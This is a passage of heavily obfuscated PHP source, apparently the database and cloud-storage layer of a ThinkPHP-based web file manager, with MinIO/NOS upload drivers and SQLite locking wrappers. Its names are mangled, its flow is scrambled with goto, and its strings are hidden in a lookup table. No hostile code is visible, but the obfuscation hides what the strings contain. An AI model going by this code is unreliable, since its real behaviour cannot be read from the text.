$bğ—¬™ŞÎ³ = $this->escapeString($bğ—¬™ŞÎ³[1]); } elseif (is_array($bğ—¬™ŞÎ³)) { $bğ—¬™ŞÎ³ = array_map(array($this, $f³±á–†¾ƒ[866]), $bğ—¬™ŞÎ³); } elseif (is_bool($bğ—¬™ŞÎ³)) { $bğ—¬™ŞÎ³ = $bğ—¬™ŞÎ³ ? $f³±á–†¾ƒ[493] : $f³±á–†¾ƒ[464]; } elseif (is_null($bğ—¬™ŞÎ³)) { $bğ—¬™ŞÎ³ = $f³±á–†¾ƒ[100]; } return $bğ—¬™ŞÎ³; } public function getLastInsertId() { $BÍ·Î†Ç˜‰ =& $_SERVER[÷ÖêïÔÔÓ]; switch ($this->dbType) { case $BÍ·Î†Ç˜‰[852]: case $BÍ·Î†Ç˜‰[844]: case $BÍ·Î†Ç˜‰[825]: case $BÍ·Î†Ç˜‰[843]: case $BÍ·Î†Ç˜‰[827]: case $BÍ·Î†Ç˜‰[855]: return $this->_linkID->lastInsertId(); case $BÍ·Î†Ç˜‰[826]: case $BÍ·Î†Ç˜‰[828]: $C¶ŠíÔá›† = $this->table; $Cè”¨ğÏ®Ø = $this->query("\123\105\114\105\103\x54\40{$C¶ŠíÔá›†}\x2e\143\165\x72\162\166\141\x6c\40\x63\165\x72\x72\x76\x61\154\x20\106\x52\117\115\x20\144\165\141\x6c"); return $Cè”¨ğÏ®Ø ? $Cè”¨ğÏ®Ø[0][$BÍ·Î†Ç˜‰[867]] : 0; } } } goto C½ŸÆŠñÁİ; a»Å‰ó¡»À: class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($bËö×“„‹) { parent::__construct($bËö×“„‹); $this->signatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($d’ë•Æ¨´‰, $Bª‡Ïáì¶á, $bßçóèîÕâ = array()) { $f“ÔÁÉá‘ã = $this->tempFile($d’ë•Æ¨´‰); $this->download($d’ë•Æ¨´‰, $f“ÔÁÉá‘ã); $Få¥²Üï ò = $this->upload($Bª‡Ïáì¶á, $f“ÔÁÉá‘ã); $this->tempFileRemve($f“ÔÁÉá‘ã); return $Få¥²Üï ò; } public function uploadFormData($B–ÄŞÉ¿‚, $D§¿™ƒ¶Ñ = 3600) { return parent::uploadFormData($B–ÄŞÉ¿‚, $D§¿™ƒ¶Ñ); } public function fileOut($CÂË™Ãø˜, $aÉ´ò¦¤î = false, $F—‘¯¯ÎâĞ = false, $eé˜³†‹·ù = '') { parent::fileOutServer($CÂË™Ãø˜, $aÉ´ò¦¤î, $F—‘¯¯ÎâĞ, $eé˜³†‹·ù); } public function fileOutLink($Bàáïœ£Î‰) { header($_SERVER[÷ÖêïÔÔÓ][153] . $Bàáïœ£Î‰); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($a­ºØ¦Ã×) { parent::__construct($a­ºØ¦Ã×); $this->signatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Fâ•õÇ¦Õ­) { header($_SERVER[÷ÖêïÔÔÓ][153] . $Fâ•õÇ¦Õ­); die; } } class PathDriverNOS extends PathDriverBaseS3 { public function __construct($Cä…ƒ»¦ã·) { parent::__construct($Cä…ƒ»¦ã·); $this->client->setSignatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($có¸Ú‚İâ, $eáÆëñ…ïÉ = '', $eÌà¥†Î–‰ = false) { $fÅÉ‘çÇƒ• =& $_SERVER[÷ÖêïÔÔÓ]; $có¸Ú‚İâ = $eÌà¥†Î–‰ ? trim($có¸Ú‚İâ, $fÅÉ‘çÇƒ•[8]) . $fÅÉ‘çÇƒ•[8] : $có¸Ú‚İâ; $FÇ²‚ª«“ã = get_file_mime(get_path_ext($có¸Ú‚İâ)); $D«Ÿš±Ñ™ = $this->client->putObject($eáÆëñ…ïÉ, $this->bucket, $có¸Ú‚İâ, $fÅÉ‘çÇƒ•[182], array(), $FÇ²‚ª«“ã); return $D«Ÿš±Ñ™ ? !0 : !1; } public function upload($f‰„Á±â”Ë, $F¸–ªÄÏä¨, $CÂŸÒ¹·©† = false, $cÙÑ­„—… = REPEAT_REPLACE) { $DÚÅ™šÑ˜¹ =& $_SERVER[÷ÖêïÔÔÓ]; $d¤•íÆ¼¬Ä = array(); $bø¶ßİ•…ğ = array($DÚÅ™šÑ˜¹[196] => get_file_mime(get_path_ext($f‰„Á±â”Ë))); if (IO::size($F¸–ªÄÏä¨) <= 1024 * 1024 * 200) { $C…°‘É¢ò‰ = $this->client->putObjectFile($F¸–ªÄÏä¨, $this->bucket, $f‰„Á±â”Ë, $DÚÅ™šÑ˜¹[182], $d¤•íÆ¼¬Ä, $bø¶ßİ•…ğ); return !empty($C…°‘É¢ò‰) ? !0 : !1; } $BàŞ§„µ®” = $this->client->multiUploadObject($F¸–ªÄÏä¨, $this->bucket, trim($f‰„Á±â”Ë, $DÚÅ™šÑ˜¹[8]), $d¤•íÆ¼¬Ä, $bø¶ßİ•…ğ); return $BàŞ§„µ®” ? $this->getPathOuter($f‰„Á±â”Ë) : !1; } public function blockChain($FõôÜ•‚¦ô, $fóÇã›¶©) { $B±±âÂÜƒ =& $_SERVER[÷ÖêïÔÔÓ]; $EÂÚÓŒÇÒ« = $this->objectMeta($FõôÜ•‚¦ô); if (!$EÂÚÓŒÇÒ«) { return !1; } return $this->client->copyObject($this->bucket, $FõôÜ•‚¦ô, $this->bucket, $FõôÜ•‚¦ô, $B±±âÂÜƒ[182], array(), $fóÇã›¶©, $B±±âÂÜƒ[1129], !0); } } goto aÏïìôÁ£§; FåìŠ·ÏÚ: define($_SERVER[÷ÖêïÔÔÓ][1836], 4); define($_SERVER[÷ÖêïÔÔÓ][1837], 5); define($_SERVER[÷ÖêïÔÔÓ][1838], 16); goto e»øÊ¨Ñ‚Ÿ; C½ŸÆŠñÁİ: class DbSqlite extends DbSqliteBase { public function query($C°ƒ”‹›²º) { goto Eš±¿ó¢˜Ç; Eš±¿ó¢˜Ç: $dÚ±‘³÷µ =& $_SERVER[÷ÖêïÔÔÓ]; $aéÏ×ªğ—• = DATA_PATH . $dÚ±‘³÷µ[868]; $B„•ª¾¬ÆÆ = fopen($aéÏ×ªğ—•, $dÚ±‘³÷µ[869]); goto Dˆ»Ä°˜ö; B²É¸×Ï“¾: fclose($B„•ª¾¬ÆÆ); show_json($dÚ±‘³÷µ[870], !1); return !1; goto fğ¤‹ˆ›ä; Dˆ»Ä°˜ö: if (!$B„•ª¾¬ÆÆ) { return !1; } if (flock($B„•ª¾¬ÆÆ, LOCK_EX)) { $Fåéî÷¤Ç” = parent::query($C°ƒ”‹›²º); flock($B„•ª¾¬ÆÆ, LOCK_UN); fclose($B„•ª¾¬ÆÆ); return $Fåéî÷¤Ç”; } flock($B„•ª¾¬ÆÆ, LOCK_UN); goto B²É¸×Ï“¾; fğ¤‹ˆ›ä: } public function execute($e¼Ø«ŞÊ) { goto d¨ŞœÌàö—; A‘ÌéôÄÓ: fclose($AŠŸ‰‚†¸Ğ); show_json($A¢¤ã©ÃŸˆ[870], !1); return !1; goto B’ß¯”éë; FÌÂáÅªìî: if (!$AŠŸ‰‚†¸Ğ) { return !1; } if (flock($AŠŸ‰‚†¸Ğ, LOCK_EX)) { $CŞŞ‰ÅİçÃ = parent::execute($e¼Ø«ŞÊ); flock($AŠŸ‰‚†¸Ğ, LOCK_UN); fclose($AŠŸ‰‚†¸Ğ); return $CŞŞ‰ÅİçÃ; } flock($AŠŸ‰‚†¸Ğ, LOCK_UN); goto A‘ÌéôÄÓ; d¨ŞœÌàö—: $A¢¤ã©ÃŸˆ =& $_SERVER[÷ÖêïÔÔÓ]; $A²ÚÕ­Ùğ = DATA_PATH . $A¢¤ã©ÃŸˆ[868]; $AŠŸ‰‚†¸Ğ = fopen($A²ÚÕ­Ùğ, $A¢¤ã©ÃŸˆ[869]); goto FÌÂáÅªìî; B’ß¯”éë: } } class DbSqlite3 extends DbSqlite3Base { public function query($D¤ÀñŒÎù) { goto FØ¾‚æˆ¶†; FØ¾‚æˆ¶†: $fÕÁ „‡É® =& $_SERVER[÷ÖêïÔÔÓ]; $EÌÔÉÙ…ó© = DATA_PATH . $fÕÁ „‡É®[868]; $Dˆåğ¨³íè = fopen($EÌÔÉÙ…ó©, $fÕÁ „‡É®[869]); goto cõ†îğêó; F‘­«‹¼Óã: fclose($Dˆåğ¨³íè); show_json($fÕÁ „‡É®[870], !1); return !1; goto b†öŒ›‘°; cõ†îğêó: if (!$Dˆåğ¨³íè) { return !1; } if (flock($Dˆåğ¨³íè, LOCK_EX)) { $aò®ãà¯Ş = parent::query($D¤ÀñŒÎù); flock($Dˆåğ¨³íè, LOCK_UN); fclose($Dˆåğ¨³íè); return $aò®ãà¯Ş; } flock($Dˆåğ¨³íè, LOCK_UN); goto F‘­«‹¼Óã; b†öŒ›‘°: } public function execute($eÛÙİõéå) { goto dõ‘ºŒ êğ; Aù²¦Ú¡¢œ: fclose($EÁí¯µ†ª–); show_json($c‘ù§ãÅ³Ä[870], !1); return !1; goto A²Ä‘òØ³; dõ‘ºŒ êğ: $c‘ù§ãÅ³Ä =& $_SERVER[÷ÖêïÔÔÓ]; $f«†Œˆ‡É‘ = DATA_PATH . $c‘ù§ãÅ³Ä[868]; $EÁí¯µ†ª– = fopen($f«†Œˆ‡É‘, $c‘ù§ãÅ³Ä[869]); goto câœóË…Æ¹; câœóË…Æ¹: if (!$EÁí¯µ†ª–) { return !1; } if (flock($EÁí¯µ†ª–, LOCK_EX)) { $A÷²ÖÇõ„Î = parent::execute($eÛÙİõéå); flock($EÁí¯µ†ª–, LOCK_UN); fclose($EÁí¯µ†ª–); return $A÷²ÖÇõ„Î; } flock($EÁí¯µ†ª–, LOCK_UN); goto Aù²¦Ú¡¢œ; A²Ä‘òØ³: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\x71" => "\x3c\76", "\x67\x74" => "\76", "\145\x67\164" => "\76\x3d", "\154\x74" => "\74", "\x65\154\x74" => "\x3c\x3d", "\156\157\164\x6c\x69\153\x65" => "\x4e\x4f\124\x20\x4c\111\x4b\x45", "\x6c\151\153\145" => "\x4c\111\113\105", "\x69\156" => "\111\x4e", "\x6e\157\164\151\156" => "\116\x4f\124\x20\x49\116", "\x6e\157\164\x20\151\156" => "\x4e\117\124\x20\x49\x4e", "\142\x65\164\x77\x65\145\156" => "\102\x45\124\x57\x45\105\x4e", "\156\157\164\x62\145\x74\167\145\x65\156" => "\116\117\x54\x20\x42\105\124\x57\x45\105\116", "\156\157\164\40\142\145\x74\167\145\145\x6e" => "\116\117\x54\40\x42\x45\124\127\105\x45\x4e"); protected $selectSql = "\123\x45\x4c\105\103\124\45\104\111\x53\124\111\x4e\103\124\45\40\45\x46\111\105\x4c\x44\x25\x20\x46\x52\117\x4d\x20\x25\124\x41\102\x4c\x45\x25\x25\112\x4f\x49\x4e\x25\x25\127\110\x45\122\x45\x25\x25\107\x52\117\x55\120\45\45\x48\x41\x56\x49\x4e\x47\x25\45\x4f\x52\x44\x45\122\x25\x25\114\x49\x4d\111\x54\45\40\x25\125\116\111\x4f\116\45\x25\x43\x4f\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $aÙÖø’ğ× = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[÷ÖêïÔÔÓ][871], $aÙÖø’ğ×); } public function factory($cÁê®Ùåâ“ = '') { goto Aè‰±¥èº; E‹ ÔÜë´¹: return $Bİï´ØíÏ; goto BÉÎŞ½íØĞ; Eñ“ß‡µšà: $this->dbType = ucwords(strtolower($cÁê®Ùåâ“[$A··º½ñ‘¸[872]])); $dÎ¾ñ–§ºî = $A··º½ñ‘¸[874] . $this->dbType; if (class_exists($dÎ¾ñ–§ºî)) { $Bİï´ØíÏ = new $dÎ¾ñ–§ºî($cÁê®Ùåâ“); if ($A··º½ñ‘¸[720] != strtolower($cÁê®Ùåâ“[$A··º½ñ‘¸[872]])) { $Bİï´ØíÏ->dbType = strtoupper($this->dbType); } else { $Bİï´ØíÏ->dbType = $this->_getDsnType($cÁê®Ùåâ“[$A··º½ñ‘¸[824]]); } } else { think_exception(think_lang($A··º½ñ‘¸[875]) . $A··º½ñ‘¸[876] . $dÎ¾ñ–§ºî); } goto E‹ ÔÜë´¹; Aè‰±¥èº: $A··º½ñ‘¸ =& $_SERVER[÷ÖêïÔÔÓ]; $cÁê®Ùåâ“ = $this->parseConfig($cÁê®Ùåâ“); if (empty($cÁê®Ùåâ“[$A··º½ñ‘¸[872]])) { think_exception(think_lang($A··º½ñ‘¸[873])); } goto Eñ“ß‡µšà; BÉÎŞ½íØĞ: } public function __call($BÖÓè¿³Ô­, $Bóö‘İæòê) { if (method_exists($this, $BÖÓè¿³Ô­)) { return call_user_func_array(array($this, $BÖÓè¿³Ô­), $Bóö‘İæòê); } } protected function _getDsnType($CŞ‹•¾á¢) { $aõœ¬İàÚˆ = explode($_SERVER[÷ÖêïÔÔÓ][4], $CŞ‹•¾á¢); $A˜ÑÈ°É• = strtoupper(trim($aõœ¬İàÚˆ[0])); return $A˜ÑÈ°É•; } private function parseConfig($C³Í¤Çèò¬ = '') { $AïÒ—ï¶‰ƒ =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($C³Í¤Çèò¬) && is_string($C³Í¤Çèò¬)) { $C³Í¤Çèò¬ = $this->parseDSN($C³Í¤Çèò¬); } elseif (is_array($C³Í¤Çèò¬)) { $C³Í¤Çèò¬ = array_change_key_case($C³Í¤Çèò¬); $C³Í¤Çèò¬ = array($AïÒ—ï¶‰ƒ[872] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[877]], $AïÒ—ï¶‰ƒ[796] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[878]], $AïÒ—ï¶‰ƒ[797] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[879]], $AïÒ—ï¶‰ƒ[794] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[880]], $AïÒ—ï¶‰ƒ[795] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[881]], $AïÒ—ï¶‰ƒ[17] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[882]], $AïÒ—ï¶‰ƒ[824] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[883]], $AïÒ—ï¶‰ƒ[13] => $C³Í¤Çèò¬[$AïÒ—ï¶‰ƒ[884]]); } elseif (empty($C³Í¤Çèò¬)) { if (think_config($AïÒ—ï¶‰ƒ[722]) && $AïÒ—ï¶‰ƒ[720] != strtolower(think_config($AïÒ—ï¶‰ƒ[719]))) { $C³Í¤Çèò¬ = $this->parseDSN(think_config($AïÒ—ï¶‰ƒ[722])); } else { $C³Í¤Çèò¬ = array($AïÒ—ï¶‰ƒ[872] => think_config($AïÒ—ï¶‰ƒ[719]), $AïÒ—ï¶‰ƒ[796] => think_config($AïÒ—ï¶‰ƒ[885]), $AïÒ—ï¶‰ƒ[797] => think_config($AïÒ—ï¶‰ƒ[886]), $AïÒ—ï¶‰ƒ[794] => think_config($AïÒ—ï¶‰ƒ[887]), $AïÒ—ï¶‰ƒ[795] => think_config($AïÒ—ï¶‰ƒ[888]), $AïÒ—ï¶‰ƒ[17] => think_config($AïÒ—ï¶‰ƒ[231]), $AïÒ—ï¶‰ƒ[824] => think_config($AïÒ—ï¶‰ƒ[722]), $AïÒ—ï¶‰ƒ[13] => think_config($AïÒ—ï¶‰ƒ[889])); } } return $C³Í¤Çèò¬; } protected function initConnect($bÖ†ô¾˜ · = true) { if (1 == think_config($_SERVER[÷ÖêïÔÔÓ][18])) { $this->_linkID = $this->multiConnect($bÖ†ô¾˜ ·); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($BÀÑÏ¯‘Ê¬ = false) { $Fîµã÷×õº =& $_SERVER[÷ÖêïÔÔÓ]; static $d°ˆ¸ôÉƒ¥ = array(); if (empty($d°ˆ¸ôÉƒ¥)) { foreach ($this->config as $EËô«¸Ã…ğ => $eÙ¯ŸøÅ´Ø) { $d°ˆ¸ôÉƒ¥[$EËô«¸Ã…ğ] = explode($Fîµã÷×õº[47], $eÙ¯ŸøÅ´Ø); } } if (think_config($Fîµã÷×õº[890])) { if ($BÀÑÏ¯‘Ê¬) { $a£Ú¸í‡Ö = floor(mt_rand(0, think_config($Fîµã÷×õº[891]) - 1)); } else { if (is_numeric(think_config($Fîµã÷×õº[892]))) { $a£Ú¸í‡Ö = think_config($Fîµã÷×õº[892]); } else { $a£Ú¸í‡Ö = floor(mt_rand(think_config($Fîµã÷×õº[891]), count($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[794]]) - 1)); } } } else { $a£Ú¸í‡Ö = floor(mt_rand(0, count($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[794]]) - 1)); } $BÂÑœÖ”ÉÆ = array($Fîµã÷×õº[796] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[796]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[796]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[796]][0], $Fîµã÷×õº[797] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[797]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[797]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[797]][0], $Fîµã÷×õº[794] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[794]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[794]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[794]][0], $Fîµã÷×õº[795] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[795]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[795]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[795]][0], $Fîµã÷×õº[17] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[17]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[17]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[17]][0], $Fîµã÷×õº[824] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[824]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[824]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[824]][0], $Fîµã÷×õº[13] => isset($d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[13]][$a£Ú¸í‡Ö]) ? $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[13]][$a£Ú¸í‡Ö] : $d°ˆ¸ôÉƒ¥[$Fîµã÷×õº[13]][0]); return $this->connect($BÂÑœÖ”ÉÆ, $a£Ú¸í‡Ö); } public function parseDSN($D´‚¾¤…‰) { $aõáŸšïÍĞ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($D´‚¾¤…‰)) { return !1; } $fã“¥‚È¬Ó = parse_url($D´‚¾¤…‰); if ($fã“¥‚È¬Ó[$aõáŸšïÍĞ[165]]) { $C™Àòª‹Ü = array($aõáŸšïÍĞ[872] => $fã“¥‚È¬Ó[$aõáŸšïÍĞ[165]], $aõáŸšïÍĞ[796] => isset($fã“¥‚È¬Ó[$aõáŸšïÍĞ[527]]) ? $fã“¥‚È¬Ó[$aõáŸšïÍĞ[527]] : $aõáŸšïÍĞ[33], $aõáŸšïÍĞ[797] => isset($fã“¥‚È¬Ó[$aõáŸšïÍĞ[893]]) ? $fã“¥‚È¬Ó[$aõáŸšïÍĞ[893]] : $aõáŸšïÍĞ[33], $aõáŸšïÍĞ[794] => isset($fã“¥‚È¬Ó[$aõáŸšïÍĞ[166]]) ? $fã“¥‚È¬Ó[$aõáŸšïÍĞ[166]] : $aõáŸšïÍĞ[33], $aõáŸšïÍĞ[795] => isset($fã“¥‚È¬Ó[$aõáŸšïÍĞ[167]]) ? $fã“¥‚È¬Ó[$aõáŸšïÍĞ[167]] : $aõáŸšïÍĞ[33], $aõáŸšïÍĞ[17] => isset($fã“¥‚È¬Ó[$aõáŸšïÍĞ[76]]) ? substr($fã“¥‚È¬Ó[$aõáŸšïÍĞ[76]], 1) : $aõáŸšïÍĞ[33]); } else { preg_match($aõáŸšïÍĞ[894], trim($D´‚¾¤…‰), $dºÑ“à¥ùá); $C™Àòª‹Ü = array($aõáŸšïÍĞ[872] => $dºÑ“à¥ùá[1], $aõáŸšïÍĞ[796] => $dºÑ“à¥ùá[2], $aõáŸšïÍĞ[797] => $dºÑ“à¥ùá[3], $aõáŸšïÍĞ[794] => $dºÑ“à¥ùá[4], $aõáŸšïÍĞ[795] => $dºÑ“à¥ùá[5], $aõáŸšïÍĞ[17] => $dºÑ“à¥ùá[6]); } $C™Àòª‹Ü[$aõáŸšïÍĞ[824]] = $aõáŸšïÍĞ[33]; return $C™Àòª‹Ü; } protected function debug() { $eÃ°æ¡»÷¾ =& $_SERVER[÷ÖêïÔÔÓ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eÃ°æ¡»÷¾[895]; if (think_config($eÃ°æ¡»÷¾[896])) { think_status($eÃ°æ¡»÷¾[897]); think_trace($this->queryStr . $eÃ°æ¡»÷¾[898] . think_status($eÃ°æ¡»÷¾[20], $eÃ°æ¡»÷¾[897], 6) . $eÃ°æ¡»÷¾[899], $eÃ°æ¡»÷¾[33], $eÃ°æ¡»÷¾[900]); } } protected function parseLock($eÉ‚´Şë¼ = false) { $bˆÃÔñ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$eÉ‚´Şë¼) { return $bˆÃÔñ[33]; } if ($bˆÃÔñ[826] == $this->dbType) { return $bˆÃÔñ[901]; } return $bˆÃÔñ[902]; } protected function parseSet($F¥Àùğ±¥) { $EÙ‡‰­„ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($F¥Àùğ±¥ as $cˆÊ³ÑùØÚ => $Cˆ‡ˆøÌ¹) { if (is_array($Cˆ‡ˆøÌ¹) && $EÙ‡‰­„[282] == $Cˆ‡ˆøÌ¹[0]) { $aÈ°ÄÖİ®İ[] = $this->parseKey($cˆÊ³ÑùØÚ) . $EÙ‡‰­„[903] . $Cˆ‡ˆøÌ¹[1]; } elseif (is_scalar($Cˆ‡ˆøÌ¹) || is_null($Cˆ‡ˆøÌ¹)) { $aÈ°ÄÖİ®İ[] = $this->parseKey($cˆÊ³ÑùØÚ) . $EÙ‡‰­„[903] . $this->parseValue($Cˆ‡ˆøÌ¹); } } return $EÙ‡‰­„[904] . implode($EÙ‡‰­„[47], $aÈ°ÄÖİ®İ); } protected function bindParam($c²ï¥™È×¦, $d›²É¸„÷) { $this->bind[$_SERVER[÷ÖêïÔÔÓ][4] . $c²ï¥™È×¦] = $d›²É¸„÷; } protected function parseBind($eÆ›Àê‡ëŠ) { $eÆ›Àê‡ëŠ = array_merge($this->bind, $eÆ›Àê‡ëŠ); $this->bind = array(); return $eÆ›Àê‡ëŠ; } function parseKey(&$b£Å‚Ì„’, $cïí§Ã‡ì = true) { if ($cïí§Ã‡ì) { $b£Å‚Ì„’ = $this->parseKeyCheck($b£Å‚Ì„’); } return $b£Å‚Ì„’; } function parseKeyCheck($dë£–‘“£´) { $F‚‡à—œ› =& $_SERVER[÷ÖêïÔÔÓ]; $dë£–‘“£´ = trim($dë£–‘“£´); if (!preg_match($F‚‡à—œ›[905], $dë£–‘“£´)) { think_exception($F‚‡à—œ›[906] . $dë£–‘“£´); } return $dë£–‘“£´; } protected function parseValue($D Æ¶ŠÄÆï) { $FßÑËæÒõ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_string($D Æ¶ŠÄÆï)) { $D Æ¶ŠÄÆï = $FßÑËæÒõ[865] . $this->escapeString($D Æ¶ŠÄÆï) . $FßÑËæÒõ[865]; } elseif (isset($D Æ¶ŠÄÆï[0]) && is_string($D Æ¶ŠÄÆï[0]) && strtolower($D Æ¶ŠÄÆï[0]) == $FßÑËæÒõ[282]) { $D Æ¶ŠÄÆï = $this->escapeString($D Æ¶ŠÄÆï[1]); } elseif (is_array($D Æ¶ŠÄÆï)) { $D Æ¶ŠÄÆï = array_map(array($this, $FßÑËæÒõ[866]), $D Æ¶ŠÄÆï); } elseif (is_bool($D Æ¶ŠÄÆï)) { $D Æ¶ŠÄÆï = $D Æ¶ŠÄÆï ? $FßÑËæÒõ[493] : $FßÑËæÒõ[464]; } elseif (is_null($D Æ¶ŠÄÆï)) { $D Æ¶ŠÄÆï = $FßÑËæÒõ[100]; } return $D Æ¶ŠÄÆï; } protected function parseField($bãËÂñ¿“) { $Eğ†»ã¾Ìò =& $_SERVER[÷ÖêïÔÔÓ]; if (is_string($bãËÂñ¿“) && strpos($bãËÂñ¿“, $Eğ†»ã¾Ìò[47])) { $bãËÂñ¿“ = explode($Eğ†»ã¾Ìò[47], $bãËÂñ¿“); } if (is_array($bãËÂñ¿“)) { $eãÌà…ªæÆ = array(); foreach ($bãËÂñ¿“ as $DÍ‡åÂ®¦ => $fø±¼ãå·) { if (!is_numeric($DÍ‡åÂ®¦)) { $eãÌà…ªæÆ[] = $this->parseKey($DÍ‡åÂ®¦) . $Eğ†»ã¾Ìò[907] . $this->parseKey($fø±¼ãå·); } else { $eãÌà…ªæÆ[] = $this->parseKey($fø±¼ãå·); } } $C«ïÅÎô’ = implode($Eğ†»ã¾Ìò[47], $eãÌà…ªæÆ); } elseif (is_string($bãËÂñ¿“) && !empty($bãËÂñ¿“)) { $C«ïÅÎô’ = $bãËÂñ¿“; } else { $C«ïÅÎô’ = $Eğ†»ã¾Ìò[173]; } return $C«ïÅÎô’; } protected function parseTable($C†“Ü×‹äÁ) { $e×òìõÁæ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($C†“Ü×‹äÁ)) { $Dß±Ö¾ë¨ = array(); foreach ($C†“Ü×‹äÁ as $eÍÛè†ùã => $AêÒµÃ…à) { if (!is_numeric($eÍÛè†ùã)) { $Dß±Ö¾ë¨[] = $this->parseKey($eÍÛè†ùã) . $e×òìõÁæ[50] . $this->parseKey($AêÒµÃ…à); } else { $Dß±Ö¾ë¨[] = $this->parseKey($eÍÛè†ùã); } } $C†“Ü×‹äÁ = $Dß±Ö¾ë¨; } elseif (is_string($C†“Ü×‹äÁ)) { if (strstr($C†“Ü×‹äÁ, $e×òìõÁæ[50])) { return $C†“Ü×‹äÁ; } $C†“Ü×‹äÁ = explode($e×òìõÁæ[47], $C†“Ü×‹äÁ); array_walk($C†“Ü×‹äÁ, array($this, $e×òìõÁæ[813])); } return $e×òìõÁæ[908] . trim(implode($e×òìõÁæ[909], $C†“Ü×‹äÁ), $e×òìõÁæ[819]) . $e×òìõÁæ[908]; } protected function parseWhere($D®Ó¿ø«‡İ) { $c‘ßà†ƒ›™ =& $_SERVER[÷ÖêïÔÔÓ]; $A»¹©ˆ“Ã‰ = $c‘ßà†ƒ›™[33]; if (is_string($D®Ó¿ø«‡İ)) { $A»¹©ˆ“Ã‰ = $D®Ó¿ø«‡İ; } else { $B ‚±–ÈÄ¬ = isset($D®Ó¿ø«‡İ[$c‘ßà†ƒ›™[910]]) ? strtoupper($D®Ó¿ø«‡İ[$c‘ßà†ƒ›™[910]]) : $c‘ßà†ƒ›™[33]; if (in_array($B ‚±–ÈÄ¬, array($c‘ßà†ƒ›™[911], $c‘ßà†ƒ›™[912], $c‘ßà†ƒ›™[913]))) { $B ‚±–ÈÄ¬ = $c‘ßà†ƒ›™[50] . $B ‚±–ÈÄ¬ . $c‘ßà†ƒ›™[50]; unset($D®Ó¿ø«‡İ[$c‘ßà†ƒ›™[910]]); } else { $B ‚±–ÈÄ¬ = $c‘ßà†ƒ›™[914]; } foreach ($D®Ó¿ø«‡İ as $a˜òéÛåÜ½ => $b¡ ªàÙìâ) { $A»¹©ˆ“Ã‰ .= $c‘ßà†ƒ›™[262]; if (is_numeric($a˜òéÛåÜ½)) { $a˜òéÛåÜ½ = $c‘ßà†ƒ›™[915]; } if (0 === strpos($a˜òéÛåÜ½, $c‘ßà†ƒ›™[71])) { $A»¹©ˆ“Ã‰ .= $this->parseThinkWhere($a˜òéÛåÜ½, $b¡ ªàÙìâ); } else { if (!preg_match($c‘ßà†ƒ›™[916], trim($a˜òéÛåÜ½))) { think_exception(think_lang($c‘ßà†ƒ›™[917]) . $c‘ßà†ƒ›™[4] . $a˜òéÛåÜ½); } $a‘“ïİâßô = is_array($b¡ ªàÙìâ) && isset($b¡ ªàÙìâ[$c‘ßà†ƒ›™[918]]); $a˜òéÛåÜ½ = trim($a˜òéÛåÜ½); if (strpos($a˜òéÛåÜ½, $c‘ßà†ƒ›™[268])) { $d‘¡Òß¦Æ‘ = explode($c‘ßà†ƒ›™[268], $a˜òéÛåÜ½); $dÈ‡¦İšÓ = array(); 